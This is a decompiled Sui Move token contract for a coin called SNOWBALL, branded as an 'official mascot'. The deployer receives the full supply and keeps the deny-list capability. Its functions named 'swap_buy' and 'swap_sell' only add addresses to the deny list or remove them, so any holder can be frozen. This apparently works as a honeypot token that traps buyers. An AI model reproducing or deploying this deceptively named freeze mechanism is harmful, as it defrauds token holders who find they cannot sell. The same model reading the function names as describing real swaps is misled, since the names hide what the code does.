module 0xf701561f19dee4603be934f0a26917be98046895666c75cb9ebfb319db2ff3ce::snowball {
    struct SNOWBALL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SNOWBALL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SNOWBALL>(arg0, 9, b"SNOWBALL", b"X OFFICIAL MASCOT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmVLqE2oarovxL8hNZ78tpomz84UkeyHyVozcGS3ZAYUye"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SNOWBALL>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SNOWBALL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SNOWBALL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SNOWBALL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SNOWBALL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SNOWBALL>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SNOWBALL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SNOWBALL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

